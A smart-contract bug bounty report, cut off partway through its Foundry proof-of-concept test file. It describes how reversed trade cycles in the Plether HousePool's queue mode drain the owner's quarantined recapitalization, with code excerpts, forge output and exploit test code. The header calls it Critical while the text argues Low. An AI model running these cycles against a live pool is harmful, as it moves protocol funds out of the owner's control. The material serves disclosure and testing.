# \#99902 [SC-Critical] Queue mode records trading revenue gross while the rebates that reverse it are paid from the owner's unassigned quarantine: an account with no LP shares drains the owner's recapitalization at its own cost

**Submitted on Nov 15th 2026 at 17:26:12 UTC by @argo_the_hacker for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99902
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

**Severity: Low.** Impact selected from the program's list: "Contract fails to deliver promised returns, but doesn't lose value". The mechanism is the program's griefing category ("no profit motive for an attacker, but damage to the users or the protocol", Medium), read down one tier because it needs a rare state: an owner recapitalization left in the unassigned quarantine, and a total wipe of both tranches. The basis, and the preconditions that bound it, are in the Impact section.

**Target:** `immunefi-team/audit-comp-plether` @ `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, `packages/perps/src/HousePool.sol` (`recordClaimantInflow`, line 646; `payOut`, lines 604-613), with the rebate sites in `packages/perps/src/libraries/CfdEnginePlanLib.sol` (lines 333 and 970-978) and `packages/perps/src/CfdEngineSettlementSidecar.sol` (lines 442-444 and 621-624).

**Relation to prior findings:** a new root. No prior item, known-issue row or repository document says that queued revenue is recorded gross without netting the rebates that reverse it. The nearest items are Cecuro MED-6, MED-26, MED-12 and LOW-65, and the nearest documentation is `SECURITY.md:1443` and `SECURITY.md:871-872`. The section "Relation to prior findings" explains each one.

## Summary

When both tranche principals are zero ("queue mode"), `HousePool.recordClaimantInflow` does not credit trading revenue to a tranche. It queues it in `pendingTradingRevenueAssets` for the claimants (`HousePool.sol:646`), and the next reconcile settles that bucket into tranche principal **ahead of** the owner's `unassignedAssets` (`HousePoolReconcilePlanLib.sol:68-74`).

Every trade that increases skew pays VPI, and that charge is queued in full. Every trade that reduces skew is paid a VPI rebate: the open rebate (`CfdEnginePlanLib.sol:333`, paid at `CfdEngineSettlementSidecar.sol:443`) or the close action rebate (`CfdEnginePlanLib.sol:970-978`, paid at `CfdEngineSettlementSidecar.sol:622`). Both rebates are paid by `HousePool.payOut` (`HousePool.sol:604-613`) from general pool cash, and neither is netted against the queued revenue it reverses. In queue mode the only cash behind the pool is the owner's `unassignedAssets` quarantine. So the rebates come out of the owner's quarantine, while the claimants keep the gross charge.

Any account can therefore move the owner's recapitalization out of the quarantine by trading both sides. One reversed cycle (account A opens LONG X, account B opens SHORT X, B closes, A closes, at a constant price) credits the claimants `2v` of queued revenue, where `v` is the VPI of one skew move, while the pool keeps only `2f` of fees in cash. At the next reconcile the `2(v − f)` difference is taken from `unassignedAssets`. The account doing this needs no role and **no LP shares**. It gains nothing and pays every fee.

The main PoC runs this at the shipped v2.0.0 risk parameters through public entry points only, apart from one documented owner action (`CfdEngine.recapitalizePool`). The pool is wiped by an independent trader's profit, not by any token manipulation, and every reconcile is the public `settleLpEpoch`. An account holding **no LP shares** runs five cycles at 35k notional with its own keeper. The owner's quarantine falls by **506.734953 USDC**, and the account ends **−280.442869 USDC**, its fees. Ten cycles drain **1,012.512922 USDC** at a cost of 560.883777. The identical cycles in a normal pool drain nothing.

If the account also holds the wiped senior claim, the same cycles become profitable: the supporting PoC's actor, holding 20k of the 21k senior supply, ends **+335.916694 USDC** while the quarantine falls by the same 506.734953.

The per-position lifetime VPI clamp (`CloseAccountingLib.sol:112-118`) is not bypassed: each position pays one VPI charge and receives one rebate of the same size. What is not netted is the pool-side queue.

## Relation to prior findings

**Cecuro MED-6** (Acknowledged, "Addressed"), "Protocol treasury can spend LP withdrawal reserves on fee top-ups". Its fix makes protocol-fee top-ups respect `getSettlementFreeAssets`, which "protects directional liabilities, the settlement buffer, trader claims, pending recapitalization/revenue, and unassigned assets". Its comment ends: "trader payout and rebate priority is unchanged". This report is not about payment priority. Even if rebates keep priority over the quarantine, the revenue they reverse should not stay queued for the claimants. MED-6 fixed one cash consumer. It does not mention that queued revenue is gross.

**Cecuro MED-26** (Acknowledged), "Owner can activate trading against ownerless pool assets". The comment accepts that "ownerless value arising after activation does not introduce a new continuous trading or queued-order gate". That covers the **precondition** here: an owner quarantine coexisting with trading. MED-26's impact is that trader PnL can "consume or depend on value governance has not yet restored to a tranche". In this report no trader PnL is involved: the price is constant during the cycles, and the trading account loses money. The quarantine is drained by the accounting asymmetry. Netting the queue against rebates closes it without touching MED-26's design choice.

**Cecuro MED-12** ("Mixed recovery inflows can strand LP revenue in ownerless pool assets") and **LOW-65** ("Owner can misroute ownerless pool assets to the junior seed receiver") concern how recapitalization and revenue are routed into or out of `unassignedAssets` by the owner. Their fixes keep ownerless value under "explicit assignment … rather than allocating them implicitly" (LOW-65 comment). This report shows the quarantine being allocated implicitly, by any account, through trading. The root is different.

**`SECURITY.md:1443`** (known limitations, VPI): "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips". That clamp is per position (`CloseAccountingLib.sol:112-118`), and nothing here gets past it: each position's lifetime VPI nets to zero (one charge of `v`, one rebate of `v`), and the trading accounts together lose 280.442869 USDC, their fees. The problem is one level up. The pool credits the gross charges to the claimants and pays the rebates from someone else's cash. The documented intent is that round trips do not move value, and in queue mode they move the owner's.

**`SECURITY.md:871-872`**: "new close-time action rebates use only pool cash free after protecting existing trader claims. Unfunded value is waived rather than claim-backed". This states which cash a close rebate may use. It protects trader claims. It does not protect queued claimant revenue or `unassignedAssets`, and it does not say that the charge the rebate reverses stays queued gross. The open rebate has no such cap at all: it must only fit in raw pool cash (`CfdEnginePlanLib.sol:729-733`).

Other reports: the pre-audit report (SC Audit Studio) item SC-M3 concerns rebate-backed initial margin, which is a different root. The Sherlock collaborative report and the Cantina report cover only the spot package. The AI scan's VPI items concern depth inputs to VPI, not where queued revenue is netted.

## Vulnerability details

**1. Queue mode records revenue gross.** `HousePool.recordClaimantInflow` (`HousePool.sol:644-648`):

```solidity
        if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
            _recordPendingClaimantInflow(kind, amount);
        } else if (seniorPrincipal + juniorPrincipal == 0) {
            _recordPendingClaimantInflow(kind, amount);
        }
```

The open planner reserves the whole positive trade cost as new queued revenue (`CfdEnginePlanLib.sol:735-736`, `snap.poolQueuesTradingRevenue && cashDeltaBeforeTopUp > 0 ? uint256(cashDeltaBeforeTopUp) : 0`). The close path records the collected close charge the same way (`CfdEngineSettlementSidecar.sol:604-613`).

**2. The rebates that reverse it are paid from general cash and never touch the queue.** The open rebate is the negative trade cost (`CfdEnginePlanLib.sol:333`). It only has to fit in raw pool cash (`CfdEnginePlanLib.sol:729-733`), and it is paid at `CfdEngineSettlementSidecar.sol:442-444`:

```solidity
        if (delta.poolRebatePayoutAssets > 0) {
            IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
        }
```

The close action rebate is capped only by cash free after trader claims (`CfdEnginePlanLib.sol:970-978`, `CashPriorityLib.reserveFreshPayouts`) and paid at `CfdEngineSettlementSidecar.sol:621-624`. `HousePool.payOut` (`HousePool.sol:604-613`) reduces `accountedAssets` and transfers. It checks no reserve and does not reduce `pendingTradingRevenueAssets`.

**3. Reconcile settles the queue ahead of the quarantine** (`HousePoolReconcilePlanLib.sol:68-74`):

```solidity
        if (pendingBucketAssets > 0) {
            snapshot.distributable =
                snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
        }

        plan.state.unassignedAssets =
            state.unassignedAssets > snapshot.distributable ? snapshot.distributable : state.unassignedAssets;
```

So whatever the rebates took out of cash is charged to `unassignedAssets`, and the gross queue becomes senior principal.

**4. Where the quarantine comes from.** `CfdEngine.recapitalizePool` is the documented owner recovery action (`SECURITY.md:155-162`). Reconcile routes it to senior up to the senior high-water mark, and "any remainder … becomes unassigned" (`HousePoolPendingPreviewLib.sol:103-136`). The repository's own rules for that bucket are "source semantics decide the owner of the inflow" and "only value with no safe claimant path belongs in `unassignedAssets`" (`ACCOUNTING_SPEC.md:647-650`). Its later owner is chosen by the owner through `assignUnassignedAssets` (owner-only, `HousePool.sol:660-663`). LP withdrawals and protocol-fee top-ups both reserve it (`ACCOUNTING_SPEC.md:266`; MED-6 fix). The two rebate payouts do not.

**Per reversed cycle** at notional `X` and pool depth `D` (`v = k·X²/(2D)`, `CfdMath.sol` VPI with `k = vpiFactor`; `f` = 4 bps execution fee):

| step | skew | trader cash | queued for claimants | pool cash |
|---|---|---|---|---|
| A opens LONG X | 0 → X | −(v + f) | +v | +v (f to treasury) |
| B opens SHORT X | X → 0 | +(v − f) | 0 | −(v − f) (open rebate) |
| B closes SHORT X | 0 → X | −(v + f) | +v | +v (f to treasury) |
| A closes LONG X | X → 0 | +(v − f) | 0 | −(v − f) (close action rebate) |
| **cycle** | | **−4f** | **+2v** | **+2f** |

The claimants are credited `2v` and the pool keeps `2f`. At reconcile the `2(v − f)` difference is taken from `unassignedAssets`. (On each skew-reducing trade the execution fee is netted against the rebate and stays in pool cash; the treasury's credit for it is the unfunded top-up that MED-6 already accepts, and it is not claimed here. In the PoC the treasury receives 140 of the 280 USDC of fees.) The quarantine loss per cycle is `2(v − f)` whoever trades. An account with no LP shares pays `4f` and receives nothing. An account holding share `s` of the receiving tranche nets `s·2v − 4f`, which with `k = 0.01` is positive for `X > 0.16·D/s`; the shipped `maxSkewRatio` of 0.4 allows `X` up to `0.4·D`.

## Impact

**Who:** any account. It needs no role and no LP shares: two trading accounts on opposite sides, executing their own orders as keeper.

**What moves:** the owner's recapitalization. In the main PoC, five cycles move **506.734953 USDC** out of `unassignedAssets`. The acting account ends **−280.442869 USDC**: it paid 280 USDC of fees and holds no claim on anything it moved. The receiving side is the wiped senior tranche: the reconcile settles 647.177822 USDC of queued revenue into it, which is exactly the 506.734953 taken from the quarantine plus the 140.442869 of the account's fees the pool kept in cash. The treasury receives the other 140.000000 of fees. The pool's ledger identity (cash equals principals + unassigned + pending buckets) holds after the reconcile. Before it, the reserved buckets exceed pool cash by exactly the amount the quarantine later loses (95,225.771371 vs 94,719.036418 USDC). The damage grows with the number of cycles and is bounded only by the quarantine: ten cycles drain 1,012.512922 USDC at a cost to the account of 560.883777.

**The damage:** an account with no stake moves protocol-held funds out of the owner's control, at its own cost and for no gain. `unassignedAssets` is the owner's to assign (`assignUnassignedAssets` is owner-only), and the repository's rule is that it stays under explicit owner assignment (LOW-65 and MED-12 remediations). After the cycles that value has become senior principal, and no path returns it to the quarantine. The owner loses the choice of who receives it and when, and part of the recapitalization funds trading fees it was never meant to fund.

**What the contract fails to deliver:** the repository's statements that rebate-only round trips do not move value (`SECURITY.md:1443`), that "source semantics decide the owner of the inflow" (`ACCOUNTING_SPEC.md:647`), and that ownerless value stays under explicit owner assignment (LOW-65 and MED-12 remediations). In queue mode, VPI round trips at a constant price move the owner's recapitalization to the claimants, at the direction of whoever chooses to trade.

**Why Low.** This is the program's griefing category: damage to the protocol that the account causing it does not profit from. It is read down one tier because it needs a rare state that no unprivileged party can create: the owner must have recapitalized more than the senior gap (so the remainder sits in `unassignedAssets`), and both tranches must have been wiped. The value moved is protocol-held owner funds, not user funds. No user loses: the senior holders gain, and the independent junior LP is untouched. The pool stays solvent. So no Critical or High line fits, and the rare precondition keeps it below Medium.

**Aggravated variant (supporting PoC).** If the acting account also holds the wiped senior claim, the cycles pay it. With 20k of the 21k senior supply, the same five cycles followed by its own full redemption leave it **+335.916694 USDC** (616.359563 USDC paid to its wallet), the quarantine again −506.734953. The identical cycles in a normal pool cost the same actor 210.804601 USDC.

**Limits, stated plainly:**
- **Owner precondition.** After trading activation, every source of `unassignedAssets` is owner-only. The PoC uses `recapitalizePool(100,000)` while senior is at its high-water mark, so the whole amount is quarantined. This is "a legitimate, documented action by a trusted role" (Scope tab), done correctly. Nothing an unprivileged party does creates the quarantine.
- **Total wipe.** Queue mode needs both principals at zero. In the PoC an independent trader's 45k LONG profits from an index move of 1.00 → 0.30 and wipes both tranches (26k of principal). A deep pool needs an extreme move for that.
- **Who receives the value.** It lands with the wiped senior tranche, which is the class a recapitalization of a wiped pool is meant to restore. An owner who planned to assign the quarantine to senior anyway loses the discretion over who receives it and when, and the fee share.
- **Cost.** The griefing costs the acting account about 0.55 USDC of fees per 1 USDC moved, and needs capital on both trading sides (40,000 USDC each in the PoC).
- **Test fixture.** The PoCs use the maintainers' `HousePoolAsyncTestBase` fixture as-is (1,000 USDC seeds, senior share cap 99.99%). The risk parameters are set to the shipped v2.0.0 values.


## Recommendation

Net rebates against the queue while the pool is queueing revenue. When `seniorPrincipal + juniorPrincipal == 0`, a VPI rebate or close action rebate paid through `payOut` should first reduce `pendingTradingRevenueAssets` (down to zero), so the claimants are credited only the net VPI the pool actually kept. Equivalently, the planners could reserve `pendingTradingRevenueAssets` and `unassignedAssets` when sizing the open rebate (`CfdEnginePlanLib.sol:729-733`) and the close rebate (`CfdEnginePlanLib.sol:970-978`), as the MED-6 fix does for protocol-fee top-ups. That would waive rebates in queue mode instead of moving them onto the quarantine. The first option keeps trader economics unchanged and closes both legs.

This is a sketch. It has not been implemented or run against the maintainers' suite. The two property tests above are the regression tests for it.


## Link to Proof of Concept

https://gist.github.com/Richter2552/e6bf16bba24d9736960389b8144a1c9a

## Proof of Concept

## Proof of Concept

The program requires PoCs to run in the repository's Foundry test suite at the commit in scope without modifying the contracts in scope. Both test files below extend the maintainers' `HousePoolAsyncTestBase` fixture (`packages/perps/test/perps/shared/HousePoolTestBase.sol`, as used by `HousePoolTerminalNav.t.sol`), with the fixture's initial deposits set to zero and the shipped v2.0.0 risk parameters (`deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json`: `vpiFactorWad` 1e16, `maxSkewRatioWad` 4e17, `executionFeeBps` 4). Every action uses a public entry point from an unprivileged account: LP `requestDeposit` / `requestRedeem` / `claimDeposit` on the tranche vaults, the permissionless `HousePool.settleLpEpoch(0, 0)`, production `OrderRouter.commitOrder(OrderRequest)` from each trader's own account, `router.executeOrder` from a keeper with no role, and the public `router.updateMarkPrice`. The single exception is labelled in each test: the owner's `CfdEngine.recapitalizePool(100,000)`. Pyth updates come from the repository's `MockPyth`, which the program allows ("Mocks may only replace components outside the scope, such as Pyth price updates").

**Main PoC, `Card9860S1GriefQuarantine.t.sol`.** The griefing accounts (`TRADER_A`, `TRADER_B`, `KEEPER`) never hold LP shares. The **property** test states the behaviour the code should have (reversed round trips at a constant price by an account with no LP shares do not move the owner's quarantine) and **fails** on the pinned code. Before that assertion it checks, and passes, that the account did not profit and that the ledger identity holds after the reconcile. The **characterize** test runs ten cycles and passes (the drain grows, the account still loses). The **control** test runs the identical cycles in a normal pool and passes.

**Supporting PoC, `Card9860S1QueueModeGrossRevenue.t.sol`.** The same mechanism with the acting account holding most of the wiped senior claim. Its property test (the actor cannot end richer) fails on the pinned code, and its normal-pool control passes.

Run instructions (from a checkout of `immunefi-team/audit-comp-plether` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8` with submodules; solc 0.8.35 via the repository's `packages/perps/foundry.toml`):

```bash
cp Card9860S1GriefQuarantine.t.sol Card9860S1QueueModeGrossRevenue.t.sol packages/perps/test/perps/accounting/waterfall/
cd packages/perps

forge test --match-contract '^Card9860S1GriefQuarantineTest$' --match-test '^test_Property_' -vv
forge test --match-contract '^Card9860S1GriefQuarantineTest$' --match-test '^test_(Characterize|Control)_' -vv

forge test --match-contract '^Card9860S1QueueModeGrossRevenueTest$' --match-test '^test_Property_' -vv
forge test --match-contract '^Card9860S1QueueModeGrossRevenueTest$' --match-test '^test_Control_' -vv
```

### Main PoC output (pinned code, unmodified contracts)

Run against the pinned commit (forge 1.8.1, solc 0.8.35, the repository's `packages/perps/foundry.toml`). Result: the characterize and control tests pass and the property test fails. Excerpt (forge `-vv` logs; USDC amounts in 1e6 units; S / J / U = senior principal, junior principal, `unassignedAssets`; pRev = `pendingTradingRevenueAssets`). The "victim senior LP gain" line counts the senior LP's remaining shares only; its one-fifth redemption (123.271912) is settled in the same epoch but not yet claimed.

```console
[PASS] test_Characterize_DrainGrowsWithCycles() (gas: 121736464)
Logs:
  ...
  10-cycle quarantine before / after 94578593549 93566080627
  10-cycle grieferNet (<0)
  -560883777

[PASS] test_Control_NormalModeNoQuarantineDrain() (gas: 59055549)
Logs:
  normal-mode quarantine (expect 0) 0 0
  normal-mode grieferNet (<0)
  -280206859

[FAIL: PROPERTY: griefer round trips drain the owner's quarantine: 506734953 != 0] test_Property_GrieferCannotDrainQuarantine() (gas: 73848360)
Logs:
  deposits done
    S / J / U 21000200914 5999799086 0
    pRev / pRecap 0 0
    pool cash / buckets / treasury 27000000000 27000000000 0
  after owner recap + public settle
    S / J / U 21000584479 4999479451 100000000000
    pRev / pRecap 0 0
    pool cash / buckets / treasury 126000063930 126000063930 0
  after trader W closes at profit (pre-reconcile)
    S / J / U 21000584479 4999479451 100000000000
    pRev / pRecap 0 0
    pool cash / buckets / treasury 94578593549 126000063930 18000000
  after public reconcile (wipe)
    S / J / U 0 0 94578593549
    pRev / pRecap 0 0
    pool cash / buckets / treasury 94578593549 94578593549 18000000
  after 5 reversed cycles (pre-reconcile)
    S / J / U 0 0 94578593549
    pRev / pRecap 647177822 0
    pool cash / buckets / treasury 94719036418 95225771371 158000000
  after public reconcile (queue settled)
    S / J / U 523905910 0 94071858596
    pRev / pRecap 0 0
    pool cash / buckets / treasury 94595764506 94595764506 158000000
  quarantine before / after 94578593549 94071858596
  griefer value before / after 80000000000 79719557131
  grieferNet (<0 = no profit)
  -280442869
  quarantineDrain (>0 = damage to protocol)
  506734953
  victim senior LP gain / treasury gain
  493087650
  140000000

Suite result: FAILED. 2 passed; 1 failed; 0 skipped
```

Expected output on a fixed contract: the property test passes (`unassignedAssets` is unchanged by the cycles, and the account's net is its fees). The characterize test's `assertLt(quarantineEnd, quarantineStart)` would then fail, which is the intended signal that the drain is gone. The control is unaffected.

### What the main PoC shows

| step | evidence in the output | result on the pinned code |
|---|---|---|
| LPs deposit through the epoch path: an independent LP holds 20k of the 21k senior supply, another holds 5k junior; the griefing accounts hold no LP shares | "deposits done" | passes |
| the owner recapitalizes 100,000 while senior is at its high-water mark; the public `settleLpEpoch` puts all of it in `unassignedAssets` | "after owner recap + public settle": U = 100,000 | passes |
| an independent trader's LONG profits from a price move and closes; the next public `settleLpEpoch` wipes both principals; the quarantine survives (U = 94,578.59); the router's commit gate is still open and the engine is not degraded | "after public reconcile (wipe)": S = J = 0 | passes |
| five reversed cycles at 35k notional, constant price, all positions closed. The claimants have 647.177822 queued, but pool cash rose only 140.442869. The buckets exceed cash by 506.734953 | "after 5 reversed cycles (pre-reconcile)" | passes |
| the senior LP's ordinary redemption request triggers the public `settleLpEpoch`, which settles the queue into senior principal and takes the difference from U (94,578.59 → 94,071.86) | "after public reconcile (queue settled)" | passes |
| the griefing accounts did not profit; ledger identity (cash = all buckets) after the reconcile | assertions before the property | pass |
| PROPERTY: round trips by an account with no LP shares do not move the owner's quarantine | `test_Property_GrieferCannotDrainQuarantine` | **FAILS**: quarantine −506.734953, account −280.442869 |
| CHARACTERIZE: ten cycles | `test_Characterize_DrainGrowsWithCycles` | passes: quarantine −1,012.512922, account −560.883777 |
| CONTROL: the identical cycles in a normal pool | `test_Control_NormalModeNoQuarantineDrain` | passes: no quarantine, account −280.206859 |

### Main PoC test file: `packages/perps/test/perps/accounting/waterfall/Card9860S1GriefQuarantine.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Queue mode, no-profit damage: a party that holds NO LP shares drains the owner's `unassignedAssets`
// recapitalization quarantine by trading both sides at a constant price, and profits nothing (it only pays fees).
// Pinned code: immunefi-team/audit-comp-plether @ a82d4fefb02768e5b3bddcc97dee371eee24fea8, unmodified contracts.
// Install path: packages/perps/test/perps/accounting/waterfall/ (next to HousePoolTerminalNav.t.sol, same fixture).
//
// MECHANISM:
//   In queue mode (seniorPrincipal + juniorPrincipal == 0, HousePool.sol:646) trading revenue is queued GROSS for the
//   tranche claimants, while the VPI open rebate (CfdEngineSettlementSidecar.sol:443) and the close action rebate
//   (:622) are paid from raw pool cash and never net the queue. In queue mode the only pool cash is the owner's
//   `unassignedAssets` quarantine, so the rebates come out of it, and at reconcile the gross queue settles into senior
//   principal AHEAD of the quarantine (HousePoolReconcilePlanLib.sol:68-74). The quarantine absorbs the 2(v-f) gap per
//   reversed cycle. This is true no matter who holds the senior shares.
//
// Sequence (every step is a public entry point except the ONE labelled owner step):
//   1. An independent senior LP (VICTIM_LP) deposits 20k; an independent junior LP deposits 5k.
//   2. OWNER (documented trusted action): CfdEngine.recapitalizePool(100k) with no senior gap => whole amount
//      quarantined in `unassignedAssets`.
//   3. Wipe by independent trader W's PnL (no token burn); a public settleLpEpoch reconciles both principals to zero.
//   4. The GRIEFER (TRADER_A, TRADER_B, KEEPER) — holding NO LP shares — trades both sides at a constant price.
//   5. A public settleLpEpoch settles the gross queue into senior principal and charges the gap to the quarantine.
//
// RESULT ON THE PINNED CODE: the quarantine (owner's recap) strictly falls, the griefer's net is negative (it only
// pays fees and holds no claim on the drained value), and value is conserved (the drain lands on the independent
// senior LP and the treasury). Damage to the protocol with no profit to the party causing it.

import {HousePoolAsyncTestBase} from "../../shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

contract Card9860S1GriefQuarantineTest is HousePoolAsyncTestBase {

    // The griefer: two trading accounts + a role-less keeper. HOLDS NO LP SHARES.
    address internal constant TRADER_A = address(0xA11CE);
    address internal constant TRADER_B = address(0xB0B);
    address internal constant KEEPER = address(0x5EE5); // any EOA, no role
    // Independent LPs (victims of the mechanism / unwitting beneficiaries).
    address internal constant VICTIM_LP = address(0xA77A); // independent senior LP
    address internal constant LP_J = address(0x10B); // independent junior LP
    address internal constant TRADER_W = address(0x3A1); // independent trader whose PnL wipes the pool
    address internal constant REFRESHER = address(0x4EF4); // any EOA

    uint256 internal constant RECAP = 100_000e6;
    uint256 internal constant VICTIM_SENIOR = 20_000e6;
    uint256 internal constant LP_J_JUNIOR = 5000e6;
    uint256 internal constant MARGIN = 10_000e6;
    uint256 internal constant TRADER_FUNDS = 40_000e6;

    uint256 internal _price = 1e8;
    uint256 private _nonce;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// Shipped v2.0.0 risk parameters
    /// (deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    // ------------------------------------------------------------------------------------------------------------
    // Public entry points (identical helpers to the companion extraction PoC)
    // ------------------------------------------------------------------------------------------------------------

    function _tickNow() private view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        uint256 nowTs = vm.getBlockTimestamp();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(_price)), 0, -8, nowTs, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _publicRefresh() private {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory data = _tickNow();
        vm.prank(REFRESHER);
        router.updateMarkPrice(data);
    }

    function _settleAt(
        uint256 epochId,
        address caller
    ) private {
        uint256 maturity = pool.lpEpochStart(epochId);
        if (vm.getBlockTimestamp() < maturity) {
            vm.warp(maturity);
        }
        vm.warp(vm.getBlockTimestamp() + 1);
        _publicRefresh();
        vm.prank(caller);
        pool.settleLpEpoch(0, 0);
    }

    function _publicDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) private {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _settleAt(requestId, lp);
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        assertEq(claimable, amount, "ghost: LP deposit finalized");
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _publicRedeemSettle(
        TrancheVault vault,
        address lp,
        uint256 shares
    ) private returns (uint256 requestId) {
        uint256 cooldownEnd = vault.lastDepositTime(lp) + vault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < cooldownEnd) {
            vm.warp(cooldownEnd);
        }
        vm.prank(lp);
        requestId = vault.requestRedeem(shares, lp, lp);
        _settleAt(requestId, REFRESHER);
    }

    function _mockUniquePythUpdateDataAt(
        uint64 publishTime,
        uint64 previousPublishTime
    ) private returns (bytes[] memory updateData) {
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(_price)), 0, int32(-8), publishTime, previousPublishTime
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(_price);
    }

    function _commitV3(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) private returns (uint64 orderId) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("grief9860", trader, ++_nonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        orderId = OrderRouter(address(router)).commitOrder(request);
    }

    function _keeperExecute(
        uint64 orderId,
        address keeper
    ) private {
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
        uint64 committedAt = pending.commitTime;
        vm.warp(uint256(committedAt) + 2);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory data = _mockUniquePythUpdateDataAt(committedAt + 1, committedAt);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory res = router.executeOrder(orderId, data);
        assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Executed), "ghost: order executed by keeper");
    }

    function _trade(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        address keeper
    ) private {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        _keeperExecute(_commitV3(trader, side, size, margin, isClose), keeper);
    }

    /// One reversed cycle at a constant price: A opens LONG, B opens SHORT (reduces skew -> rebate), B closes, A closes
    /// (reduces skew -> rebate). Net per cycle: traders lose fees, claimants queued +2v, pool cash +2f.
    function _cycle(
        uint256 size
    ) private {
        _trade(TRADER_A, CfdTypes.Side.LONG, size, MARGIN, false, KEEPER);
        _trade(TRADER_B, CfdTypes.Side.SHORT, size, MARGIN, false, KEEPER);
        _trade(TRADER_B, CfdTypes.Side.SHORT, size, 0, true, KEEPER);
        _trade(TRADER_A, CfdTypes.Side.LONG, size, 0, true, KEEPER);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Value accounting
    // ------------------------------------------------------------------------------------------------------------

    function _accountValue(
        address who
    ) private view returns (uint256) {
        IMarginClearinghouse.AccountAssetBuckets memory b = clearinghouse.getAccountAssetBuckets(who);
        return settlementToken.balanceOf(who) + b.settlementBalanceAssets + engine.traderClaimBalanceAssets(who);
    }

    function _lpValue(
        TrancheVault vault,
        uint256 principal,
        address who
    ) private view returns (uint256) {
        uint256 supply = vault.totalSupply();
        return supply == 0 ? 0 : (vault.balanceOf(who) * principal) / supply;
    }

    /// GRIEFER = both trading accounts + the keeper. It holds NO LP shares, so it has no claim on the senior tranche
    /// that the gross queue settles into. Its only levers are trading fees and the rebate round trips.
    function _grieferValue() private view returns (uint256) {
        return _accountValue(TRADER_A) + _accountValue(TRADER_B) + _accountValue(KEEPER);
    }

    /// The independent senior LP's value (shares priced at current senior principal + any redeemed wallet cash).
    function _victimLpValue() private view returns (uint256) {
        return settlementToken.balanceOf(VICTIM_LP) + _lpValue(seniorVault, pool.seniorPrincipal(), VICTIM_LP);
    }

    function _ledgerLog(
        string memory step
    ) private view {
        uint256 cash = settlementToken.balanceOf(address(pool));
